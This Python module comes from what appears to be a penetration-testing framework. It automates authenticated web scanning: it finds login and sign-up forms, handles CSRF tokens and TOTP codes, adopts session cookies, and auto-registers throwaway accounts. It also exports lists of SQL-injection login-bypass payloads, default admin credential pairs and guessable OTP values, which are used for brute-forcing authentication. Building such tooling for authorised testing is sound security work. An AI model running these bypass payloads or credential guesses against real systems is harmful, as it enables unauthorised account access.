"""VAJRA authenticated-scan bootstrap — web.auth_login.

When the operator supplies webapp credentials (--web-user/--web-pass and
optionally --web-login URL, --web-otp static code or --web-totp-secret
base32 secret), this module:

  1. discovers the login form (--web-login URL, else crawl seed pages and
     pick the best candidate with a password field),
  2. parses hidden CSRF / token fields (including <meta name=csrf-token>),
  3. POSTs the supplied credentials, injecting the OTP when the form asks
     for one (static value or RFC 6238 TOTP generated on the spot),
  4. adopts Set-Cookie session cookies into the framework HTTP client so
     every later web module (crawl, dirbuster, injection, tech, headers)
     runs in the authenticated context,
  5. verifies the session and records which identity it holds.

The exported AUTH_BYPASSES / OTP_TRICKS lists are shared with the exploit
phase and web login brute-forcing, so the auth logic stays in one place."""
import html
import re
from urllib.parse import urljoin, urlparse

from core.database import Finding
from core.utils import extract_forms, extract_links

LOGIN_HINTS = ("login", "signin", "sign-in", "signon", "sign-on", "auth",
               "session", "account", "user", "connect", "admin", "secure")
OTP_NAMES = {"otp", "code", "passcode", "twofa", "2fa", "mfa", "totp",
             "pin", "authcode", "verificationcode", "verification_code",
             "verification code", "one_time_code", "onetp"}
CSRF_NAMES = {"csrf", "csrf_token", "csrfmiddlewaretoken", "_token",
              "authenticity_token", "__requestverificationtoken",
              "_csrf", "x-csrf-token", "token"}
USER_NAMES = {"user", "username", "login", "email", "user_name",
              "userid", "user_id", "account", "j_username", "mail"}
PASS_NAMES = {"pass", "password", "pwd", "passwd", "j_password",
              "userpass", "passcode"}

# Registration-form surface detection + per-field routing, used by
# auto_register() to create a throwaway red-team account and then stand up an
# authenticated session for the rest of the web phase.
REGISTER_HINTS = ("register", "signup", "sign-up", "sign_up", "create.account",
                  "create-account", "create_account", "new account", "join",
                  "enroll", "create user", "user.create", "registration",
                  "account.create", "sign.on")
CONFIRM_NAMES = {"confirm", "confirm_password", "confirmpassword",
                 "confirm-password", "password2", "repassword", "re-password",
                 "password_confirm", "pass2", "cpassword", "verifypassword",
                 "passwd2", "password_check", "passwordcheck"}
EMAIL_NAMES = {"email", "e-mail", "mail", "email_address", "emailaddress",
               "user_email", "emailid", "email_id", "register_email"}
DISPLAY_NAMES = {"name", "fullname", "full_name", "firstname", "first_name",
                 "lastname", "last_name", "displayname", "display_name",
                 "persnum", "nickname"}
TERMS_NAMES = {"terms", "terms_of_service", "terms_of_use",
               "terms_and_conditions", "agree", "accept", "agreement",
               "i_agree", "tos", "consent", "terms_check"}
REGISTER_FAIL_RE = re.compile(
    r"already (registered|in use|exists)|(username|user|email|member) "
    r".*(exists|taken|in use)|registration failed|could not (create|register)|"
    r"error creating|invalid (email|username|password)|password.*(mismatch|"
    r"too short|does not match)", re.I)
REGISTER_OK_RE = re.compile(
    r"account created|registration (successful|complete)|created your account|"
    r"welcome[!,\s]|verify (our|your|the) email|activation (link|email) sent|"
    r"check (our|your) inbox|profile (created|set up)", re.I)

# Auth-bypass payload families for password-login forms (username injection,
# comment-injection, tautologies, encoded variants). Each entry is a pair
# (username, password).
AUTH_BYPASSES = [
    ("' OR '1'='1'-- -", "x"),
    ("' OR '1'='1'--", "x"),
    ("' OR 1=1-- -", "x"),
    ("' OR 1=1--", "x"),
    ("' OR 1=1-- -", "x"),
    ("' OR 1=1#", "x"),
    ("admin'-- -", "x"),
    ("admin'--", "x"),
    ("admin'#", "x"),
    ("admin' /*", "x"),
    ("admin' OR '1'='1", "x"),
    ("') OR ('1'='1", "x"),
    ("'='", "'='"),
    ("1'='1", "x"),
    ("' or '1'='1' limit 1-- -", "x"),
    ('" OR ""="', "x"),
    ('admin" -- ', "x"),
    ("admin", "' OR '1'='1'-- -"),
    ("admin", "' OR 1=1-- -"),
    ("admin", "'='"),
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "administrator"),
    ("admin", "123456"),
    ("root", "root"),
]

# OTP-field tricks over and above using the real supplied OTP when possible.
OTP_TRICKS = ["", "000000", "111111", "123456", "0000000",
              "' OR '1'='1'-- -", "999999"]


def user_field(fields):
    for f in fields:
        n = (f.get("name") or "").lower()
        if n in USER_NAMES or ("user" in n and "conf" not in n
                               and "confirm" not in n and "password" not in n):
            return f["name"]
    for f in fields:
        t = (f.get("type") or "").lower()
        if t in ("email", "text") and (f.get("name") or "").strip():
            return f["name"]
    return None


def pass_field(fields):
    for f in fields:
        if (f.get("type") or "").lower() == "password":
            return f["name"]
    return None


def otp_field(fields):
    for f in fields:
        n = (f.get("name") or "").strip().lower()
        t = f.get("type")
        if n in OTP_NAMES or any(k in n for k in ("otp", "2fa", "mfa",
                                                   "passcode", "authcode",
                                                   "verification")):
            return f["name"]
    return None


def csrf_field(fields):
    for f in fields:
        t = (f.get("type") or "").lower()
        n = (f.get("name") or "").strip().lower()
        if t == "hidden" and (n in CSRF_NAMES or n.rstrip(")") in CSRF_NAMES
                              or n.endswith("token") or "csrf" in n):
            return f["name"]
    return None


def confirm_field(fields):
    """A 'confirm your password' input, if the registration form asks for one."""
    for f in fields:
        n = (f.get("name") or "").strip().lower()
        if n in CONFIRM_NAMES or "confirm" in n or "verify" in n:
            return f["name"]
    return None


def email_field(fields):
    for f in fields:
        t = (f.get("type") or "").lower()
        n = (f.get("name") or "").strip().lower()
        if n in EMAIL_NAMES or t == "email":
            return f["name"]
    return None


def display_field(fields):
    for f in fields:
        n = (f.get("name") or "").strip().lower()
        if n in DISPLAY_NAMES or n in ("first_name", "last_name"):
            return f["name"]
    return None


def register_user_field(fields):
    """Registration usually has a distinct username input; prefer that over
    an email-named/-typed field so we don't smother the email column."""
    for f in fields:
        t = (f.get("type") or "").lower()
        n = (f.get("name") or "").strip().lower()
        if t == "email":
            continue
        if n in ("username", "user_name", "userid", "user_id", "login",
                 "account", "new_user", "newuser", "handle") or "user" in n:
            return f["name"]
    return user_field(fields)


def terms_field(fields):
    for f in fields:
        n = (f.get("name") or "").strip().lower()
        if n in TERMS_NAMES:
            return f["name"]
    return None


def pick_register_form(forms, skip_actions=None):
    """Best registration-form candidate: needs a password field; prefers an
    action URL with an explicit register/signup hint, and never reuses the
    discovered login form."""
    skip = {a.lower() for a in (skip_actions or [])}
    candidates = []
    for f in forms:
        fields = f.get("fields", [])
        if not pass_field(fields):
            continue
        action = (f.get("action") or "").lower()
        if action in skip:
            continue
        hint = any(h in action for h in REGISTER_HINTS)
        has_user = user_field(fields) is not None
        candidates.append((hint, has_user, f))
    if not candidates:
        return None
    # explicit register/signup forms first, then any pass+user form
    hit = [f for (h, u, f) in candidates if h and u] or \
          [f for (h, u, f) in candidates if h] or \
          [f for (h, u, f) in candidates if u] or \
          [f for (h, u, f) in candidates]
    return hit[0]


def random_identity(prefix="vjr"):
    """Fresh throwaway account identity: name, email, strong password."""
    import secrets
    return {
        "username": "%s_%s" % (prefix, secrets.token_hex(6)),
        "email": "%s_%s@%s.local" % (prefix, secrets.token_hex(6), prefix),
        "password": "Vjr!%s" % secrets.token_hex(10),
    }


def likely_registered(resp, pre_cookies, form_action_html=""):
    """Heuristic that a registration POST really created an account: no
    'already exists / taken / failed' marker, has a success marker, changed
    the session cookie, or redirected away from the register page."""
    body = resp.body or ""
    if REGISTER_FAIL_RE.search(body):
        return False
    loc = (resp.headers.get("location") or resp.url or "").lower()
    if any(h in loc for h in ("register", "signup", "error", "failed")):
        return False
    if REGISTER_OK_RE.search(body):
        return True
    cookies = resp.cookies_str
    new_cookie = cookies and _cfg_norm(cookies) != _cfg_norm(pre_cookies)
    if new_cookie:
        return True
    if "<input" in body and re.search(r"type=[\"']password[\"']", body, re.I):
        return False
    return 200 <= resp.status < 400 and (bool(loc) or bool(cookies))


def pick_login_form(forms):
    """Best login-form candidate: password field required, prefer actions
    whose URL carries an auth keyword."""
    best = None
    best_score = -1
    for f in forms:
        fields = f.get("fields", [])
        if not pass_field(fields):
            continue
        action = (f.get("action") or "").lower()
        score = sum(1 for h in LOGIN_HINTS if h in action)
        if not user_field(fields):
            score -= 0.5
        if score > best_score:
            best, best_score = f, score
    return best


def csrf_from_page(body, fieldname=None):
    """Pull a CSRF token from <meta> tags (fresh SPA logins often put it
    there instead of in the form)."""
    for m in re.finditer(r'<meta[^>]+name=["\'](?:csrf-token|csrf_token|_csrf)'
                         r'["\'][^>]+content=["\']([^"\']+)', body or "",
                         re.I):
        return html.unescape(m.group(1)).strip()
    return None


def build_data(fields, ufield, pfield, user_val, pass_val,
               otp=None, csrf_value=None):
    data = {}
    for f in fields:
        data[f["name"]] = f.get("value", "")
    if ufield:
        data[ufield] = user_val
    data[pfield] = pass_val
    if otp is not None:
        of = otp_field(fields)
        if of:
            data[of] = otp
    if csrf_value:
        cf = csrf_field(fields)
        if cf:
            data[cf] = csrf_value
    return {k: v for k, v in data.items() if v is not None}


def likely_logged_in(resp, action_html, pre_cookies):
    """Heuristic: status in 200-399, page no longer shows a password input
    nor an 'invalid/incorrect login' message, or we got a new session cookie."""
    loc = (resp.headers.get("location") or resp.url or "").lower()
    if loc and any(h in loc for h in ("login", "signin", "auth",
                                       "error", "failed")):
        return False
    body = resp.body or ""
    if re.search(r"invalid (user|credentials|login|password)|incorrect "
                 r"(password|credentials)|wrong password|login failed|"
                 r"authentication failed", body, re.I):
        return False
    if "<input" in body and re.search(r"type=[\"']password[\"']", body,
                                      re.I):
        return False
    cookies = resp.cookies_str
    new_cookie = cookies and _cfg_norm(cookies) != _cfg_norm(pre_cookies)
    return new_cookie or bool(loc) or (200 <= resp.status < 400)


def _cfg_norm(s):
    return " ".join(sorted(x.strip() for x in s.split(";"))) if s else ""


def _candidates(engine):
    """Ordered login candidates: explicit URL, then seed pages' forms."""
    cands = []
    web = engine.state.get("web_targets", []) or []
    explicit = getattr(engine.args, "web_login", None)
    if explicit:
        cands.append(explicit)
    for w in web:
        u = w["url"] if isinstance(w, dict) else str(w)
        if u not in cands:
            cands.append(u)
    return [c for c in cands if c][:6]


def _collect_forms(engine, limit=8):
    """Gather unique forms from the candidate seed pages plus the explicit
    --web-login URL. Used by both login and registration discovery."""
    forms = []
    seen = set()
    for url in _candidates(engine)[:limit]:
        if url in seen:
            continue
        seen.add(url)
        try:
            r = engine.http.get(url, timeout=min(8, engine.http.timeout))
        except Exception:
            continue
        if not r.body:
            continue
        for f in extract_forms(r.body, r.url or url):
            if f["action"] not in [x["action"] for x in forms]:
                forms.append(f)
    return forms


_PAGE_SUFFIX_SKIP = (".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg",
                     ".ico", ".woff", ".woff2", ".ttf", ".eot", ".webp",
                     ".mp4", ".mp3", ".zip", ".pdf", ".txt")


def _surface_forms(engine, max_pages=14, target=None):
    """Harvest auth surfaces from the seed pages PLUS same-host pages reached
    by following their links — many apps keep the registration/signup form
    behind a navigation link rather than inline on the seed page.

    ``target`` controls the crawl focus:
    * "register": keep following links until a password form whose action
      looks like a sign-up is located (an inline login form alone is not
      enough); visit a fresh page on every hit so a real sign-up surface
      isn't shadowed.
    * "login" (default): collect every same-host password form and return them
      all, letting pick_login_form choose the true login action (which may be
      a login-named page while a register page also carries a password form).
    """
    forms = _collect_forms(engine)

    def done():
        if target == "register":
            return _register_like(forms)
        return any(pass_field(f.get("fields", [])) for f in forms)

    if done():
        return forms

    hosts = {urlparse(u).netloc for u in _candidates(engine)}
    frontier, seen = [], set()
    for url in _candidates(engine)[:6]:
        try:
            r = engine.http.get(url, timeout=min(8, engine.http.timeout))
        except Exception:
            continue
        for link in extract_links(r.body or "", r.url or url):
            if urlparse(link).netloc not in hosts:
                continue
            if link.lower().endswith(_PAGE_SUFFIX_SKIP) or link in seen:
                continue
            seen.add(link)
            frontier.append(link)
    # sign-up-looking links first so a registration surface wins the budget
    frontier.sort(key=lambda u: any(h in u.lower() for h in REGISTER_HINTS),
                  reverse=True)
    fetched = 0
    for url in frontier:
        if fetched >= max_pages:
            break
        fetched += 1
        try:
            r = engine.http.get(url, timeout=min(8, engine.http.timeout))
        except Exception:
            continue
        if not r.body:
            continue
        for f in extract_forms(r.body, r.url or url):
            if f["action"] not in [x["action"] for x in forms]:
                forms.append(f)
        if target != "login" and done():
            break
    if target == "login":
        # prefer the true login surface: drop register/signup-surfaced forms
        # so credentials aren't POSTed to a sign-up action.
        logged = [f for f in forms
                  if pass_field(f.get("fields", [])) and
                  not any(h in (f.get("action") or "").lower()
                          for h in REGISTER_HINTS)]
        if logged:
            return logged
    return forms


def _register_like(forms):
    return any(
        pass_field(f.get("fields", [])) and
        any(h in (f.get("action") or "").lower() for h in REGISTER_HINTS)
        for f in forms)


def login(engine, creds=None):
    t = engine.target
    args = engine.args
    if creds is None:
        user = getattr(args, "web_user", None) or \
            getattr(args, "web_pass", None)
        if not user:
            return
        pwd = getattr(args, "web_pass", None) or ""
        creds = {"user": user, "password": pwd,
                 "otp": getattr(args, "web_otp", None) or "",
                 "totp": getattr(args, "web_totp_secret", None) or "",
                 "login": getattr(args, "web_login", None) or ""}
    user = creds["user"]
    pwd = creds.get("password", "") or ""
    engine.state["web_auth"] = {"user": user, "established": False,
                                "method": "form", "login_url": "",
                                "cookie": "", "csrf": ""}
    forms = _surface_forms(engine, target="login")
    form = pick_login_form(forms)
    if not form:
        if creds.get("auto"):
            return False
        engine.db.add_finding(Finding(
            t.display, "web.auth_login", "coverage", "info",
            "Authentication system not auto-discovered "
            "(use --web-login <url>)",
            detail="No login form with a password field was found on "
                   "the seed pages; supply --web-login to target the "
                   "authenticated flow explicitly.",
            confidence="possible"))
        return False
    engine.state["web_auth"]["login_url"] = form["action"]
    ufield = user_field(form["fields"])
    pfield = pass_field(form["fields"])
    csrfv = csrf_field(form["fields"])
    token = ""
    if csrfv:
        page = engine.http.get(form["action"],
                               timeout=min(8, engine.http.timeout))
        hidden = next((f.get("value", "") for f in form["fields"]
                       if f["name"] == csrfv), "")
        token = csrf_from_page(page.body) or hidden

    otp_given = creds.get("otp", "") or ""
    if not otp_given and creds.get("totp", ""):
        from core.crypto_mini import totp_codes
        try:
            otp_given = totp_codes(creds["totp"], window=1)[0]
        except Exception:
            otp_given = ""
    of = otp_field(form["fields"])
    engine.state["web_auth"]["csrf"] = token

    before = engine.http._cookie if hasattr(engine.http, "_cookie") else ""
    data = build_data(form["fields"], ufield, pfield, user, pwd,
                      otp=(otp_given if (of or otp_given) else ""),
                      csrf_value=(token if token else None))
    method = (form.get("method") or "post").lower()
    try:
        if method == "get":
            resp = engine.http.get(form["action"], params=data,
                                   allow_redirects=False)
        else:
            resp = engine.http.post(form["action"], data=data,
                                    allow_redirects=False)
    except Exception as e:
        engine.db.add_finding(Finding(
            t.display, "web.auth_login", "coverage", "info",
            "Login POST failed: %r" % e, confidence="possible"))
        return False
    cookies = resp.cookies_str
    if cookies:
        engine.http.apply_cookies(cookies)
    loc = resp.headers.get("location") or ""
    follow = resp
    if loc:
        # login usually 302s; adopt the session cookie and follow manually so
        # the authenticated page is what we judge against.
        try:
            follow = engine.http.get(urljoin(form["action"], loc),
                                     timeout=min(8, engine.http.timeout))
        except Exception:
            pass
        extra = follow.cookies_str
        if extra:
            engine.http.apply_cookies(extra)
    ok = likely_logged_in(follow, form.get("page", ""), before) \
        or bool(cookies)
    engine.state["web_auth"]["established"] = ok
    engine.state["web_auth"]["cookie"] = follow.cookies_str or cookies
    engine.state["authenticated"] = ok
    method_note = "TOTP" if (not otp_given and creds["totp"]) else (
        "static OTP" if otp_given else "no MFA/OTP")
    detail = ("POST %s\nuser=%s\nmethod=form (%s)\ncsrf=%s\noauth sets:\n%s"
              % (form["action"], user, method_note,
                 token and "yes" or "no",
                 cookies and "\n".join(c.split(";")[0]
                                       for c in cookies.split("\n"))
                 or "(no Set-Cookie)"))
    if ok:
        engine.db.add_finding(Finding(
            t.display, "web.auth_login", "recon", "info",
            "AUTHENTICATED web session established as %s" % user,
            detail=detail,
            evidence="session cookie adopted; subsequent web modules run "
                     "authenticated",
            confidence="firm"))
        engine.log.success("[web-auth] authenticated as %s (%s) — %s"
                           % (user, method_note, form["action"]))
    else:
        engine.db.add_finding(Finding(
            t.display, "web.auth_login", "recon", "info",
            "Web login attempt did NOT establish a session (%s)"
            % method_note,
            detail=detail,
            evidence="post=%s status=%s len=%s\nredirect=%s" %
                     (form["action"], resp.status, len(resp.body or ""),
                      resp.headers.get("location", "")),
            confidence="possible"))
        engine.log.warn("[web-auth] login not confirmed for %s (%s)" %
                        (user, form["action"]))
    return ok


def auto_register(engine, label="A"):
    """Register a throwaway account on a discovered registration form, adopt
    the resulting session, and (if the app needs an extra login step even
    after signup) log in with the generated identity. Returns the identity
    dict on success, else None. Exposed to other modules so the escalation
    sweep can mint a second baseline account with label 'B'."""
    t = engine.target
    if getattr(engine.args, "no_autoreg", False):
        return None
    forms = _surface_forms(engine, target="register")
    if not any(pass_field(f.get("fields", [])) for f in forms):
        # No password-bearing input anywhere on the seed pages: this is not an
        # app with an auth surface, so stay completely silent (no finding).
        return None
    lf = None
    if getattr(engine.args, "web_user", None) or getattr(engine.args,
                                                        "web_login", None):
        lf = pick_login_form(forms)
    rform = pick_register_form(
        forms, {lf["action"]} if lf and lf.get("action") else set())
    if not rform:
        engine.db.add_finding(Finding(
            t.display, "web.autoreg", "coverage", "info",
            "No registration form found — authenticated checks skipped",
            detail="The app exposes password inputs but no registration/"
                   "signup form was discovered on the seed pages. Pass "
                   "--web-user/--web-pass (and --web-login) to run the "
                   "authenticated flow instead of auto-registration.",
            confidence="possible"))
        return None
    fields = rform["fields"]
    ident = random_identity("vjr" + label.lower() if label != "A" else "vjr")
    ufield = register_user_field(fields)
    pfield = pass_field(fields)
    ef = email_field(fields)
    cf = confirm_field(fields)
    nf = display_field(fields)
    tf = terms_field(fields)
    csrfv = csrf_field(fields)
    token = ""
    if csrfv:
        try:
            page = engine.http.get(rform["action"],
                                   timeout=min(8, engine.http.timeout))
            hidden = next((f.get("value", "") for f in fields
                           if f["name"] == csrfv), "")
            token = csrf_from_page(page.body) or hidden
        except Exception:
            token = ""
    data = build_data(fields, ufield, pfield,
                      ident["username"], ident["password"])
    if ef:
        data[ef] = ident["email"]
    if cf:
        data[cf] = ident["password"]
    if nf:
        data[nf] = "Vajra Red Team"
    if tf:
        data[tf] = "1"
    if csrfv and token:
        data[csrfv] = token
    method = (rform.get("method") or "post").lower()
    before = engine.http._cookie if hasattr(engine.http, "_cookie") else ""
    try:
        if method == "get":
            resp = engine.http.get(rform["action"], params=data,
                                   allow_redirects=False)
        else:
            resp = engine.http.post(rform["action"], data=data,
                                    allow_redirects=False)
    except Exception as e:
        engine.db.add_finding(Finding(
            t.display, "web.autoreg", "coverage", "info",
            "Registration POST failed: %r" % e, confidence="possible"))
        return None
    cookies = resp.cookies_str
    if cookies:
        engine.http.apply_cookies(cookies)
    loc = resp.headers.get("location") or ""
    follow = resp
    if loc:
        try:
            follow = engine.http.get(urljoin(rform["action"], loc),
                                     timeout=min(8, engine.http.timeout))
        except Exception:
            pass
        extra = follow.cookies_str
        if extra:
            engine.http.apply_cookies(extra)
    ok = likely_registered(follow, before, rform.get("page", ""))
    followed_cookie = follow.cookies_str or cookies
    creds = {"user": ident["username"], "password": ident["password"],
             "email": ident["email"], "label": label,
             "register_url": rform["action"], "auto": True}
    regs = engine.state.setdefault("_autoreg", {})
    regs[label] = dict(creds, cookie=followed_cookie)
    if ok and not (engine.state.get("web_auth", {}) or {}).get(
            "established"):
        if followed_cookie:
            # registration handed over a real session - adopt it
            engine.state["web_auth"] = {
                "user": ident["username"], "established": True,
                "method": "register", "login_url": rform["action"],
                "cookie": followed_cookie, "csrf": token}
            engine.state["authenticated"] = True
        else:
            login(engine, creds)  # sign-up needs an explicit login step
    detail = ("auto-registered throwaway %s account\n%s %s\nfields=%s\n"
               "action=%s\ncredential row (for authorized re-use):\n  %s\n  "
               "%s\n  %s"
               % (label, method.upper(), rform["action"],
                  ", ".join(sorted(x["name"] for x in fields)),
                  rform["action"], ident["username"], ident["email"],
                  ident["password"]))
    if ok:
        engine.db.add_finding(Finding(
            t.display, "web.autoreg", "recon", "info",
            "Auto-registered %s account %s" % (label, ident["username"]),
            detail=detail,
            evidence="POST %s status=%s len=%s redirect=%s" %
                     (rform["action"], follow.status, len(follow.body or ""),
                      loc or "(none)"),
            confidence="firm"))
        engine.log.success("[web-autoreg] %s account created: %s (%s)"
                           % (label, ident["username"], rform["action"]))
    else:
        engine.db.add_finding(Finding(
            t.display, "web.autoreg", "coverage", "info",
            "Registration form found but account may not have been created "
            "(%s)" % label,
            detail=detail,
            evidence="POST %s status=%s len=%s redirect=%s\n(gate: no "
                     "success marker, cookie unchanged, not redirected" %
                     (rform["action"], follow.status, len(follow.body or ""),
                      loc or "(none)"),
            confidence="possible"))
        engine.log.warn("[web-autoreg] %s signup not confirmed on %s"
                        % (label, rform["action"]))
    if ok:
        return creds
    return None


def run(engine):
    user = getattr(engine.args, "web_user", None) or \
        getattr(engine.args, "web_pass", None)
    if user:
        login(engine)
    elif not getattr(engine.args, "no_autoreg", False):
        auto_register(engine)